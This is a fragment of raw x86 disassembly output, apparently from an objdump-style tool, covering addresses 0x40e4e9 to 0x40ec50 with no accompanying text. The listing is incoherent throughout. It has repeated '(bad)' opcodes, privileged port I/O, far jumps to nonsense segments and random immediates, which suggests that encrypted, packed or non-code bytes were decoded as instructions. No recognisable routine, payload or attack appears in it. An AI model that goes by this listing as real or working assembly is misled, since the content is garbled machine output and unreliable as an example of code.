  40e4e9:	mov    ecx,0x63f0c281
  40e4ee:	fcomp  st(1)
  40e4f0:	out    dx,al
  40e4f1:	out    0xa4,al
  40e4f3:	test   DWORD PTR [edi],eax
  40e4f5:	ja     0x40e4e1
  40e4f7:	lahf   
  40e4f8:	cdq    
  40e4f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4fa:	pop    eax
  40e4fb:	jp     0x40e4cc
  40e4fd:	pop    ss
  40e4fe:	lods   al,BYTE PTR ds:[esi]
  40e4ff:	dec    edi
  40e500:	fsub   DWORD PTR [ebp+0x10]
  40e503:	xor    edx,DWORD PTR [ebx+0x7f]
  40e506:	adc    eax,0x4851bab0
  40e50b:	and    DWORD PTR [ebp+0x37141e5d],esi
  40e511:	aad    0x6c
  40e513:	xchg   esp,eax
  40e514:	out    0x2e,al
  40e516:	jmp    0x40e4ed
  40e518:	mov    edi,DWORD PTR [esi+0x58]
  40e51b:	fisttp DWORD PTR ds:0x789b0be6
  40e521:	jae    0x40e4f9
  40e523:	clc    
  40e524:	icebp  
  40e525:	inc    si
  40e527:	jge    0x40e56e
  40e529:	sbb    al,0x8b
  40e52b:	les    ebx,FWORD PTR [eax-0x1f6afa8f]
  40e531:	mov    al,0x4c
  40e533:	push   es
  40e534:	aad    0x32
  40e536:	call   0xb8cb2889
  40e53b:	jno    0x40e514
  40e53d:	pop    ss
  40e53e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e53f:	leave  
  40e540:	mov    ecx,0x9f8a6a6d
  40e545:	(bad)
  40e549:	ss jmp 0x4d68:0x18d2bc2f
  40e551:	dec    esi
  40e552:	rcl    BYTE PTR [edi-0x58],1
  40e555:	mov    edx,0x4d1a1f02
  40e55a:	jmp    0x76a6:0x108a8e87
  40e561:	mov    cl,0xa3
  40e563:	mov    cl,0x37
  40e565:	mov    ah,0x14
  40e567:	pop    edi
  40e568:	pop    ss
  40e569:	xor    edx,ebx
  40e56b:	mov    dh,0x3a
  40e56d:	aas    
  40e56e:	sub    al,0x9a
  40e570:	(bad)  
  40e572:	or     DWORD PTR ds:0xa829bc39,edx
  40e578:	shl    BYTE PTR [ebp-0x13bfa378],1
  40e57e:	pop    esi
  40e57f:	mov    ebp,0x3945ae90
  40e584:	adc    ah,al
  40e586:	adc    eax,0xd919d36e
  40e58b:	rcl    DWORD PTR [eax],cl
  40e58d:	es inc si
  40e590:	push   cs
  40e591:	test   al,0x3a
  40e593:	leave  
  40e594:	ficomp WORD PTR [esi-0x52]
  40e597:	(bad)  
  40e598:	mov    eax,0x2c787a18
  40e59d:	sub    DWORD PTR [ebp+0x32],esp
  40e5a0:	into   
  40e5a1:	test   BYTE PTR ds:0xa355d9e2,ch
  40e5a7:	lea    ebx,[ebx+0x5d]
  40e5aa:	jnp    0x40e5a1
  40e5ac:	sbb    BYTE PTR ds:0xdc4d8dda,ch
  40e5b2:	shl    DWORD PTR fs:[ebx+0x708a9592],0x88
  40e5ba:	adc    eax,0x3233e3f7
  40e5bf:	dec    edx
  40e5c0:	das    
  40e5c1:	test   eax,0x8f9fe878
  40e5c6:	fistp  DWORD PTR [ebx]
  40e5c8:	jle    0x40e60e
  40e5ca:	add    BYTE PTR [ebx+0x64],dh
  40e5cd:	xchg   edi,eax
  40e5ce:	xchg   dh,ch
  40e5d0:	xlat   BYTE PTR ds:[ebx]
  40e5d1:	rcl    BYTE PTR [ecx+0x3c],0x6e
  40e5d5:	leave  
  40e5d6:	cli    
  40e5d7:	push   edx
  40e5d8:	or     ebx,DWORD PTR [eax-0x380de050]
  40e5de:	cmp    DWORD PTR [ebx],esi
  40e5e0:	mov    ds:0xf395bad8,eax
  40e5e5:	mov    ah,0xce
  40e5e7:	(bad)  
  40e5e8:	int    0xad
  40e5ea:	jge    0x40e65e
  40e5ec:	loope  0x40e583
  40e5ee:	push   ebp
  40e5ef:	nop
  40e5f0:	inc    edx
  40e5f1:	xor    ch,BYTE PTR [ebx+edi*8-0x7a56adaa]
  40e5f8:	mov    ch,0x37
  40e5fa:	mov    ds:0x268d2869,eax
  40e5ff:	mov    al,BYTE PTR [ecx]
  40e601:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e602:	clc    
  40e603:	push   ds
  40e604:	test   eax,0x76899670
  40e609:	sub    DWORD PTR [edx+0x62],edx
  40e60c:	inc    edx
  40e60d:	jne    0x40e613
  40e60f:	test   DWORD PTR [edx],ebp
  40e611:	jne    0x40e5a0
  40e613:	or     edx,DWORD PTR [edi-0x343fa23a]
  40e619:	inc    ecx
  40e61a:	ror    BYTE PTR [edx],cl
  40e61c:	int3   
  40e61d:	cmp    al,0x65
  40e61f:	adc    al,0xa5
  40e621:	lods   al,BYTE PTR fs:[esi]
  40e623:	mov    ebp,gs
  40e625:	in     al,0xf6
  40e627:	mov    es,WORD PTR [edi+0x62610329]
  40e62d:	jae    0x40e650
  40e62f:	loop   0x40e66f
  40e631:	aas    
  40e632:	pop    edx
  40e633:	adc    edi,DWORD PTR ds:0xb9fa0e22
  40e639:	jmp    0xfbc71f45
  40e63e:	mov    al,ds:0xec87aee3
  40e643:	inc    edi
  40e644:	sti    
  40e645:	inc    eax
  40e646:	mov    eax,ss
  40e648:	fs push 0xffffffd3
  40e64b:	sbb    ch,bh
  40e64d:	cmp    ecx,DWORD PTR [esi+0x6d]
  40e650:	sbb    BYTE PTR [edx+0xd],al
  40e653:	or     dl,BYTE PTR [esi+0x20]
  40e656:	pop    edx
  40e657:	sbb    eax,0x32ff2df6
  40e65c:	js     0x40e6a4
  40e65e:	retf   
  40e65f:	and    BYTE PTR [ecx],ch
  40e661:	mov    WORD PTR [ebp+0x71b4b447],fs
  40e667:	pop    esp
  40e668:	mov    al,bh
  40e66a:	in     eax,dx
  40e66b:	dec    esi
  40e66c:	fild   WORD PTR [edi]
  40e66e:	mov    WORD PTR [ebp+ebp*2+0x40bc8f9c],ds
  40e675:	(bad)
  40e678:	test   al,0xc
  40e67a:	mov    esi,0x3f6cb8d2
  40e67f:	xchg   esi,eax
  40e680:	es push edi
  40e682:	mov    edx,edi
  40e684:	sub    ch,BYTE PTR ds:0x4f411beb
  40e68b:	out    0x8d,al
  40e68d:	outs   dx,BYTE PTR ds:[esi]
  40e68e:	pop    es
  40e68f:	jecxz  0x40e6dd
  40e691:	inc    ebx
  40e692:	sub    ecx,0xffffffdc
  40e695:	push   esp
  40e696:	push   eax
  40e697:	cmp    BYTE PTR [esi+0x46],bl
  40e69a:	xor    al,al
  40e69c:	aad    0xf7
  40e69e:	push   cs
  40e69f:	dec    edi
  40e6a0:	call   0x6cfb4594
  40e6a5:	add    dh,dl
  40e6a7:	xchg   ebp,eax
  40e6a8:	dec    edx
  40e6a9:	xor    ebx,ebp
  40e6ab:	loop   0x40e6c0
  40e6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6ae:	and    eax,0x77129faf
  40e6b3:	dec    dx
  40e6b5:	or     al,0x58
  40e6b7:	lock cmp al,0xfe
  40e6ba:	rol    DWORD PTR [esp+esi*1-0x36b72653],0x38
  40e6c2:	lea    ecx,[ebp+0x3e0ee708]
  40e6c8:	jne    0x40e6b6
  40e6ca:	or     esp,ebx
  40e6cc:	shl    BYTE PTR [ebx+0x6cab9bc8],cl
  40e6d2:	scas   eax,DWORD PTR es:[edi]
  40e6d3:	mov    BYTE PTR [ecx+0x4],ah
  40e6d6:	or     eax,0xd8107be9
  40e6db:	pop    esi
  40e6dc:	lahf   
  40e6dd:	cwde   
  40e6de:	xor    eax,0x127c8529
  40e6e3:	inc    bh
  40e6e5:	push   esp
  40e6e6:	test   BYTE PTR [ecx+0x5d8c9b96],0x34
  40e6ed:	mov    ecx,0xcccaee50
  40e6f2:	mov    edi,0xcdd9db07
  40e6f7:	fwait
  40e6f8:	rol    BYTE PTR ds:0xa00a4685,1
  40e6fe:	sbb    eax,0xf21db65d
  40e703:	fistp  WORD PTR [edi]
  40e705:	sar    cl,0xd4
  40e708:	repnz inc ebp
  40e70a:	dec    ecx
  40e70b:	or     al,0x2f
  40e70d:	xchg   DWORD PTR [ecx],edi
  40e70f:	call   0x2d80:0x477e0bfa
  40e716:	push   0x1e30e78b
  40e71b:	add    BYTE PTR [ecx+eiz*1],ah
  40e71e:	icebp  
  40e71f:	ss push ebp
  40e721:	jle    0x40e6a5
  40e723:	test   BYTE PTR [eax+ebp*2],al
  40e726:	and    esp,DWORD PTR [esi+0x2c]
  40e729:	sahf   
  40e72a:	cwde   
  40e72b:	and    al,0x8e
  40e72d:	fmul   QWORD PTR [eax+ecx*1-0x4613f75c]
  40e734:	and    ecx,DWORD PTR [ecx]
  40e736:	xor    DWORD PTR [ecx],esi
  40e738:	gs das 
  40e73a:	cmp    bl,ch
  40e73c:	mov    bh,0xc9
  40e73e:	inc    esp
  40e73f:	shl    DWORD PTR [eax],1
  40e741:	mov    esi,0x733e294c
  40e746:	mov    esi,fs
  40e748:	add    bh,BYTE PTR [ecx+0x3da6297a]
  40e74e:	bound  edx,QWORD PTR [esi+edi*8]
  40e751:	jecxz  0x40e700
  40e753:	loop   0x40e79f
  40e755:	cmp    al,0x41
  40e757:	jae    0x40e74b
  40e759:	out    dx,eax
  40e75a:	(bad)  
  40e75c:	and    DWORD PTR [edx-0xe],ebx
  40e75f:	stc    
  40e760:	cmp    BYTE PTR [esi-0x13],al
  40e763:	xor    BYTE PTR [eax-0x2],cl
  40e766:	dec    esp
  40e767:	out    dx,al
  40e768:	xor    eax,0xf4f53f8
  40e76d:	push   edi
  40e76e:	arpl   si,di
  40e770:	ret    
  40e771:	dec    ebx
  40e772:	aad    0xc4
  40e774:	fistp  DWORD PTR [esp+ebp*1]
  40e777:	bound  edi,QWORD PTR [eax-0x50]
  40e77a:	cmp    DWORD PTR [esi+eiz*4-0x2],esp
  40e77e:	stc    
  40e77f:	xchg   bh,bl
  40e781:	in     eax,dx
  40e782:	pusha  
  40e783:	(bad)  
  40e784:	mov    dl,0x8a
  40e786:	cmp    bh,cl
  40e788:	xchg   DWORD PTR [ecx+0x3e],ebp
  40e78b:	and    BYTE PTR [edx-0x5714da18],0xe
  40e792:	xchg   ecx,eax
  40e793:	add    al,0x15
  40e795:	jo     0x40e789
  40e797:	lea    ebp,[esp+ebx*1]
  40e79a:	xchg   edi,eax
  40e79b:	clc    
  40e79c:	mov    fs,WORD PTR [edi]
  40e79e:	or     eax,0xd5d888e7
  40e7a3:	pop    edx
  40e7a4:	push   es
  40e7a5:	cmp    eax,0x44976d98
  40e7aa:	mov    al,ds:0x9fa649ec
  40e7af:	stos   BYTE PTR es:[edi],al
  40e7b0:	popf   
  40e7b1:	scas   al,BYTE PTR es:[edi]
  40e7b2:	sbb    al,dh
  40e7b4:	mov    al,ds:0x7cb76f69
  40e7b9:	test   eax,0x59392b47
  40e7be:	stos   DWORD PTR es:[edi],eax
  40e7bf:	and    DWORD PTR [edx+esi*1+0x52a3f466],eax
  40e7c6:	jo     0x40e792
  40e7c8:	xlat   BYTE PTR ds:[ebx]
  40e7c9:	mov    bl,0xe6
  40e7cb:	push   ecx
  40e7cc:	(bad)  
  40e7cd:	loope  0x40e82a
  40e7cf:	xchg   ecx,ebx
  40e7d1:	pop    es
  40e7d2:	push   ebx
  40e7d3:	mov    eax,ds:0x59a28c9c
  40e7d8:	rol    DWORD PTR [edi-0xcd70164],cl
  40e7de:	dec    esi
  40e7df:	jnp    0x40e770
  40e7e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7e2:	test   eax,0x80eb6c
  40e7e7:	(bad)
  40e7eb:	stos   BYTE PTR es:[edi],al
  40e7ec:	dec    eax
  40e7ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ee:	or     al,bl
  40e7f0:	xor    ch,BYTE PTR [edx+0x20efe8e8]
  40e7f6:	aaa    
  40e7f7:	push   ebx
  40e7f8:	pop    esp
  40e7f9:	ficom  WORD PTR [ebx]
  40e7fb:	pop    edi
  40e7fc:	fild   DWORD PTR [ebx+eiz*1-0x5fba33a2]
  40e803:	pop    edx
  40e804:	xchg   ebx,eax
  40e805:	mov    ch,BYTE PTR [ebx-0x3547c166]
  40e80b:	push   cs
  40e80c:	fbstp  TBYTE PTR [eax]
  40e80e:	add    BYTE PTR [eax-0x60],cl
  40e811:	out    0xdc,eax
  40e813:	pop    edi
  40e814:	push   ebx
  40e815:	or     esi,esi
  40e817:	movd   mm3,DWORD PTR [ebp-0x22fbf2d6]
  40e81e:	daa    
  40e81f:	adc    esp,DWORD PTR [edi-0x67]
  40e822:	xchg   edi,eax
  40e823:	ficomp WORD PTR [ecx+0x76]
  40e826:	push   eax
  40e827:	call   0xd739:0x9f87e59f
  40e82e:	jl     0x40e82e
  40e830:	dec    eax
  40e831:	or     esi,0x46e5d30a
  40e837:	sub    edi,ecx
  40e839:	lahf   
  40e83a:	je     0x40e881
  40e83c:	sti    
  40e83d:	or     DWORD PTR [esi+ecx*8+0x5994491f],ecx
  40e844:	mov    esi,0xc2e24eac
  40e849:	push   eax
  40e84a:	mov    edx,0xb2a9abf6
  40e84f:	(bad)  
  40e850:	cld    
  40e851:	lods   eax,DWORD PTR fs:[esi]
  40e853:	adc    BYTE PTR [edi+0x11],0x4c
  40e857:	fistp  QWORD PTR [ebp-0x56]
  40e85a:	mov    al,ah
  40e85c:	ja     0x40e84c
  40e85e:	addr16 dec esp
  40e860:	arpl   WORD PTR [edi-0x32],cx
  40e863:	xor    ebx,ecx
  40e865:	adc    eax,0x2ff01961
  40e86a:	pop    ebx
  40e86b:	call   DWORD PTR [edi-0x23]
  40e86e:	pop    ecx
  40e86f:	inc    edi
  40e870:	out    dx,eax
  40e871:	inc    edx
  40e872:	repnz popa 
  40e874:	call   0x49a1:0x14ed8c44
  40e87b:	fwait
  40e87c:	ins    BYTE PTR es:[edi],dx
  40e87d:	repnz (bad) 
  40e87f:	push   ecx
  40e880:	jecxz  0x40e8ff
  40e882:	jmp    0x40e8b7
  40e884:	ror    DWORD PTR [edi+0x33],1
  40e887:	test   al,0xb
  40e889:	and    al,0x55
  40e88b:	and    DWORD PTR [eax+0x4b669ad3],esi
  40e891:	and    cl,BYTE PTR [edx]
  40e893:	add    DWORD PTR ds:0xbaa79092,0x2a275ccd
  40e89d:	mov    ah,0x59
  40e89f:	cmp    BYTE PTR [ebx],cl
  40e8a1:	fmul   QWORD PTR [eax-0x3e]
  40e8a4:	inc    edx
  40e8a5:	mov    ebx,0xfd72a068
  40e8aa:	mov    ch,dl
  40e8ac:	test   al,0x1d
  40e8ae:	mov    ecx,0xc467864b
  40e8b3:	jle    0x40e8f4
  40e8b5:	ds inc esi
  40e8b7:	sub    DWORD PTR [ebx],0xffffffbe
  40e8ba:	push   eax
  40e8bb:	xchg   esi,eax
  40e8bc:	mov    bh,BYTE PTR [eax]
  40e8be:	jno    0x40e892
  40e8c0:	fild   WORD PTR [esi]
  40e8c2:	jmp    0x40e8c6
  40e8c4:	or     eax,0x9f8eb93c
  40e8c9:	push   edi
  40e8ca:	aad    0xa0
  40e8cc:	add    dl,BYTE PTR [ebp+0x28293318]
  40e8d2:	stos   BYTE PTR es:[edi],al
  40e8d3:	mov    dl,0xb4
  40e8d5:	shl    DWORD PTR [eax+eax*8],0x61
  40e8d9:	add    ebx,DWORD PTR [edx]
  40e8db:	mov    al,0x6f
  40e8dd:	fs pop es
  40e8df:	mov    esi,0x801627ec
  40e8e4:	not    BYTE PTR [esp+ebx*2+0x50]
  40e8e8:	jge    0x40e917
  40e8ea:	sahf   
  40e8eb:	pushf  
  40e8ec:	sbb    al,0xf9
  40e8ee:	in     eax,dx
  40e8ef:	daa    
  40e8f0:	inc    eax
  40e8f1:	jmp    0x40e90d
  40e8f3:	or     edi,edx
  40e8f5:	sbb    DWORD PTR [esi],ecx
  40e8f7:	pushf  
  40e8f8:	test   DWORD PTR [eax],0x14bdb69f
  40e8fe:	inc    esp
  40e8ff:	jge    0x40e96d
  40e901:	retf   
  40e902:	xor    ecx,DWORD PTR [ebp+0x357ae989]
  40e908:	out    0x88,al
  40e90a:	sub    esi,edx
  40e90c:	mov    ah,0x16
  40e90e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e90f:	and    ebx,edx
  40e911:	sbb    al,0x8d
  40e913:	scas   eax,DWORD PTR es:[edi]
  40e914:	pop    sp
  40e916:	fs rol edx,cl
  40e919:	int    0x4e
  40e91b:	inc    edx
  40e91c:	xchg   esi,eax
  40e91d:	mov    bl,0xd5
  40e91f:	pushf  
  40e920:	fwait
  40e921:	xor    dh,BYTE PTR [edx+0x62]
  40e924:	push   esi
  40e925:	cld    
  40e926:	push   esp
  40e927:	dec    edx
  40e928:	ret    
  40e929:	or     eax,0x85cffd9
  40e92e:	dec    edx
  40e92f:	pop    ecx
  40e930:	sbb    ebx,DWORD PTR [edi-0x2e]
  40e933:	into   
  40e934:	jge    0x40e901
  40e936:	xor    al,0x1d
  40e938:	cmp    al,0x11
  40e93a:	jb     0x40e9a7
  40e93c:	rol    DWORD PTR [ecx+ecx*2-0x29],1
  40e940:	stc    
  40e941:	xchg   esp,eax
  40e942:	ror    BYTE PTR [edi],1
  40e944:	jne    0x40e92d
  40e946:	sub    esi,DWORD PTR [edi-0x78613472]
  40e94c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e94d:	mov    edx,0x74c94933
  40e952:	in     eax,0xfb
  40e954:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e955:	test   DWORD PTR ds:0xabff50c5,ecx
  40e95b:	push   esp
  40e95c:	test   al,0x6
  40e95e:	dec    ecx
  40e95f:	inc    ebp
  40e960:	add    DWORD PTR [ebp+0x1dd1af54],ecx
  40e966:	sub    edi,DWORD PTR [ebp+eiz*1+0x36]
  40e96a:	test   al,0x85
  40e96c:	jne    0x40e912
  40e96e:	add    bh,0xc2
  40e971:	popa   
  40e972:	leave  
  40e973:	aam    0x58
  40e975:	sbb    DWORD PTR [edx+0x5e],eax
  40e978:	push   es
  40e979:	cmc    
  40e97a:	pop    ds
  40e97b:	cs inc esp
  40e97d:	xchg   ebx,eax
  40e97e:	pop    esp
  40e97f:	dec    ebp
  40e980:	aad    0x9b
  40e982:	mov    ch,0xda
  40e984:	jae    0x40e969
  40e986:	mov    al,ds:0xdb1e95be
  40e98c:	cmp    eax,0x96031ce2
  40e991:	or     eax,0x97fc70e
  40e996:	xchg   BYTE PTR [ecx+0x2f],al
  40e999:	idiv   DWORD PTR [edx+0x44]
  40e99c:	xor    DWORD PTR [edx+0x65494cfb],ebp
  40e9a2:	nop
  40e9a3:	lods   al,BYTE PTR ds:[esi]
  40e9a4:	mov    cl,0x64
  40e9a6:	popa   
  40e9a7:	lock arpl WORD PTR gs:[ecx+0x42],bx
  40e9ac:	addr16 xchg ah,cl
  40e9af:	jbe    0x40e947
  40e9b1:	pop    ds
  40e9b2:	ja     0x40e95f
  40e9b4:	cwde   
  40e9b5:	push   ss
  40e9b6:	or     BYTE PTR [ebx-0x9],dh
  40e9b9:	retf   
  40e9ba:	out    0x9b,al
  40e9bc:	mov    al,0xe0
  40e9be:	(bad)  
  40e9bf:	out    0xab,eax
  40e9c1:	mov    ecx,DWORD PTR [esi-0x549a2976]
  40e9c7:	shl    esp,1
  40e9c9:	test   ebp,0x5ed30298
  40e9cf:	cli    
  40e9d0:	jae    0x40e9e4
  40e9d2:	mov    bl,0xe8
  40e9d4:	outs   dx,DWORD PTR ds:[esi]
  40e9d5:	aas    
  40e9d6:	mov    bl,0x2b
  40e9d8:	push   ds
  40e9d9:	xchg   ebx,eax
  40e9da:	adc    BYTE PTR [edx-0x70],al
  40e9dd:	fs mov al,0x0
  40e9e0:	cmp    esi,eax
  40e9e2:	addr16 into 
  40e9e4:	dec    ecx
  40e9e5:	mov    al,ds:0xa87b1f64
  40e9ea:	pop    esi
  40e9eb:	leave  
  40e9ec:	cli    
  40e9ed:	xchg   edi,eax
  40e9ee:	outs   dx,BYTE PTR ds:[esi]
  40e9ef:	or     edx,DWORD PTR [edx-0x9]
  40e9f2:	pop    ecx
  40e9f3:	call   0x248d2e99
  40e9f8:	fmul   DWORD PTR [edi+0x1c194196]
  40e9fe:	add    edx,DWORD PTR [esi-0x76b0faa9]
  40ea04:	test   eax,0xaa1c866d
  40ea09:	and    esi,0x63ee55c2
  40ea0f:	enter  0x5c55,0x51
  40ea13:	push   ss
  40ea14:	into   
  40ea15:	dec    eax
  40ea16:	addr16 fwait
  40ea18:	push   es
  40ea19:	addr16 in eax,dx
  40ea1b:	scas   eax,DWORD PTR es:[edi]
  40ea1c:	dec    edi
  40ea1d:	add    BYTE PTR [ecx-0x43],dh
  40ea20:	xor    al,0xf9
  40ea22:	std    
  40ea23:	mov    ebx,0x27edf201
  40ea28:	popa   
  40ea29:	scas   al,BYTE PTR es:[edi]
  40ea2a:	pop    edi
  40ea2b:	(bad)  
  40ea2c:	aam    0xdb
  40ea2e:	jmp    0x40ea85
  40ea30:	pop    edx
  40ea31:	setns  ah
  40ea34:	nop
  40ea35:	cmp    ebp,DWORD PTR [esi+0x40]
  40ea38:	cdq    
  40ea39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea3a:	nop
  40ea3b:	adc    DWORD PTR [esi],edi
  40ea3d:	data16 cld 
  40ea3f:	nop
  40ea40:	in     eax,dx
  40ea41:	sub    eax,0x40d66d7b
  40ea46:	and    eax,0x15ec16fb
  40ea4b:	push   esi
  40ea4c:	je     0x40ea05
  40ea4e:	out    dx,al
  40ea4f:	stos   DWORD PTR es:[edi],eax
  40ea50:	into   
  40ea51:	es dec edx
  40ea53:	cmp    eax,eax
  40ea55:	add    DWORD PTR [eax-0x6a],esp
  40ea58:	clc    
  40ea59:	or     esi,edi
  40ea5b:	mov    bh,0x86
  40ea5d:	daa    
  40ea5e:	xor    ecx,edi
  40ea60:	imul   ebx,DWORD PTR [ebp+0x13],0xfffffff0
  40ea64:	push   esi
  40ea65:	or     al,0xac
  40ea67:	add    eax,0xa4ecdc85
  40ea6c:	popa   
  40ea6d:	loop   0x40ea4d
  40ea6f:	jl     0x40ea02
  40ea71:	cdq    
  40ea72:	adc    ebp,edi
  40ea74:	rcl    dl,cl
  40ea76:	push   0xffffffb0
  40ea78:	push   edi
  40ea79:	add    ecx,DWORD PTR [ebx-0x58]
  40ea7c:	mov    edx,0xdb4650e5
  40ea81:	adc    al,0x89
  40ea83:	add    al,0x2f
  40ea85:	mov    eax,ds:0x188af2ab
  40ea8a:	cmp    BYTE PTR [esi+0x7080b1af],dl
  40ea90:	cld    
  40ea91:	mov    dh,0x97
  40ea93:	js     0x40ea9b
  40ea95:	inc    edx
  40ea96:	xor    eax,0xe0cc274a
  40ea9b:	sub    DWORD PTR [eax-0x6d638b19],edi
  40eaa1:	sub    DWORD PTR [eax+0x4faa5868],ebx
  40eaa7:	pop    ecx
  40eaa8:	xchg   edx,eax
  40eaa9:	(bad)  
  40eaaa:	daa    
  40eaab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaac:	mov    edx,edi
  40eaae:	ret    0x7b89
  40eab1:	mov    ch,0xa9
  40eab3:	inc    edx
  40eab4:	fbld   TBYTE PTR [edx]
  40eab6:	stos   BYTE PTR es:[edi],al
  40eab7:	repnz data16 das 
  40eaba:	ror    esi,1
  40eabc:	add    ebp,DWORD PTR [eax-0x55a811ba]
  40eac2:	hlt    
  40eac3:	push   eax
  40eac4:	add    edi,eax
  40eac6:	mov    eax,ds:0x8cc5e47f
  40eacb:	and    esi,esi
  40eacd:	push   edx
  40eace:	push   eax
  40eacf:	cmp    ebx,ecx
  40ead1:	adc    BYTE PTR [ebx-0x2b],dl
  40ead4:	mov    ds:0xcd02ef70,eax
  40ead9:	pop    edx
  40eada:	add    al,0xc4
  40eadc:	adc    al,0x3b
  40eade:	dec    edx
  40eadf:	add    DWORD PTR [eax-0x9d9d332],esi
  40eae5:	add    al,0x37
  40eae7:	(bad)  
  40eae8:	sub    esp,ecx
  40eaea:	mov    ebp,0xd60347da
  40eaef:	aas    
  40eaf0:	adc    esi,DWORD PTR [eax]
  40eaf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaf3:	mov    esi,0xb96e7d4d
  40eaf8:	addr16 mov ah,0x9d
  40eafb:	in     al,dx
  40eafc:	jle    0x40eace
  40eafe:	daa    
  40eaff:	adc    al,0xd5
  40eb01:	xchg   ebp,eax
  40eb02:	mov    al,ds:0xc5b28746
  40eb07:	jmp    0x6184:0x1c49a8cd
  40eb0e:	jecxz  0x40eae4
  40eb10:	retf   0xe4c1
  40eb13:	fwait
  40eb14:	pop    edx
  40eb15:	sub    DWORD PTR [ecx+0x5b84ef3d],esp
  40eb1b:	mov    ds:0x99547d88,eax
  40eb20:	sti    
  40eb21:	and    edx,DWORD PTR [ecx-0xa8d4429]
  40eb27:	push   eax
  40eb28:	imul   ebx,DWORD PTR [ebp+0x27116a05],0xffffffad
  40eb2f:	and    dh,dh
  40eb31:	adc    eax,0xa004ff44
  40eb36:	push   ebp
  40eb37:	mov    esi,0x2a330c42
  40eb3c:	popa   
  40eb3d:	bound  ebx,QWORD PTR [esi+0x3a]
  40eb40:	push   edi
  40eb41:	mov    eax,ds:0x9ee7a459
  40eb46:	mov    cl,0xa2
  40eb48:	push   0x1e
  40eb4a:	popf   
  40eb4b:	push   0xffffffc2
  40eb4d:	ins    DWORD PTR es:[edi],dx
  40eb4e:	fld    TBYTE PTR [esi+0x7]
  40eb51:	test   al,0x51
  40eb53:	sub    DWORD PTR [edx*4-0x6621036],eax
  40eb5a:	and    DWORD PTR [edi+0x46],0x33
  40eb5e:	mov    esp,0xb552a5d9
  40eb63:	inc    ecx
  40eb64:	test   BYTE PTR ds:0x9a2597e9,bh
  40eb6a:	push   ecx
  40eb6b:	lahf   
  40eb6c:	xchg   ebp,eax
  40eb6d:	adc    esi,DWORD PTR [edx]
  40eb6f:	sbb    eax,DWORD PTR [edx+0x3a0d0417]
  40eb75:	mov    al,0xc8
  40eb77:	xor    DWORD PTR [edi-0x29],edi
  40eb7a:	clc    
  40eb7b:	out    dx,al
  40eb7c:	push   ds
  40eb7d:	adc    eax,0xd21ae3e7
  40eb82:	push   ecx
  40eb83:	pop    eax
  40eb84:	inc    edi
  40eb85:	mov    ds:0xd38eb10b,al
  40eb8a:	fmul   DWORD PTR [edi+0x38c4e95]
  40eb90:	inc    esp
  40eb91:	das    
  40eb92:	lods   al,BYTE PTR ds:[esi]
  40eb93:	add    BYTE PTR [edx+ebp*1],cl
  40eb96:	push   esi
  40eb97:	adc    eax,0x17ef1299
  40eb9c:	mov    bl,0x9f
  40eb9e:	fwait
  40eb9f:	add    al,0x21
  40eba1:	(bad)  
  40eba3:	jb     0x40ebd8
  40eba5:	fcomp  DWORD PTR ds:0xe372a10
  40ebab:	ins    DWORD PTR es:[edi],dx
  40ebac:	mov    bl,0x2d
  40ebae:	jb     0x40ebb2
  40ebb0:	cdq    
  40ebb1:	or     dh,BYTE PTR [esi]
  40ebb3:	cmc    
  40ebb4:	push   eax
  40ebb5:	shr    DWORD PTR [esp+esi*8-0x5c],0x37
  40ebba:	into   
  40ebbb:	jle    0x40ebd8
  40ebbd:	mov    esp,0xb55ecd39
  40ebc2:	fidiv  DWORD PTR [ecx+0x42]
  40ebc5:	mov    esp,0xfc023432
  40ebca:	add    BYTE PTR [edx+ebx*4],bh
  40ebcd:	ds call 0xc7b1:0x1cdf0932
  40ebd5:	xor    edx,DWORD PTR [eax]
  40ebd7:	retf   0x8410
  40ebda:	out    0xc8,eax
  40ebdc:	pop    ss
  40ebdd:	fdiv   QWORD PTR [ebx]
  40ebdf:	je     0x40ebbf
  40ebe1:	sbb    bh,al
  40ebe3:	inc    edx
  40ebe4:	sub    DWORD PTR [ecx+0x3c53159a],ebx
  40ebea:	mov    ebx,DWORD PTR [edx+ecx*1+0x37]
  40ebee:	jg     0x40ebee
  40ebf0:	push   cs
  40ebf1:	cmp    DWORD PTR [esi],ecx
  40ebf3:	(bad)  
  40ebf4:	nop
  40ebf5:	jne    0x40ebed
  40ebf7:	push   ds
  40ebf8:	and    al,0x7e
  40ebfa:	add    al,0x60
  40ebfc:	mov    bh,bl
  40ebfe:	and    al,0x89
  40ec00:	xchg   ebx,eax
  40ec01:	cmp    bl,BYTE PTR [edi]
  40ec03:	mov    eax,0xd124f731
  40ec08:	out    0xd9,eax
  40ec0a:	nop
  40ec0b:	or     al,0x46
  40ec0d:	mov    dh,BYTE PTR [ecx]
  40ec0f:	jns    0x40ec8e
  40ec11:	aas    
  40ec12:	clc    
  40ec13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec14:	ja     0x40ec1b
  40ec16:	push   ebx
  40ec17:	int3   
  40ec18:	inc    ebp
  40ec19:	mov    gs,WORD PTR [ecx]
  40ec1b:	inc    edi
  40ec1c:	inc    ebx
  40ec1d:	jp     0x40ec03
  40ec1f:	cdq    
  40ec20:	jo     0x40ec24
  40ec22:	push   esp
  40ec23:	(bad)
  40ec28:	or     esp,DWORD PTR [ebx+0x5b885535]
  40ec2e:	push   es
  40ec2f:	or     esi,DWORD PTR [ebx+0x6e55c52e]
  40ec35:	jno    0x40ec39
  40ec37:	xor    cl,BYTE PTR [edx+0x26ecb27f]
  40ec3d:	mov    esi,0xe9290854
  40ec42:	sbb    eax,0x6892c72a
  40ec47:	cld    
  40ec48:	std    
  40ec49:	pop    ecx
  40ec4a:	lahf   
  40ec4b:	mov    dl,0xa
  40ec4d:	jb     0x40eca0
  40ec4f:	cld    
  40ec50:	adc    DWORD PTR [ebx+eax*1+0x43],edi
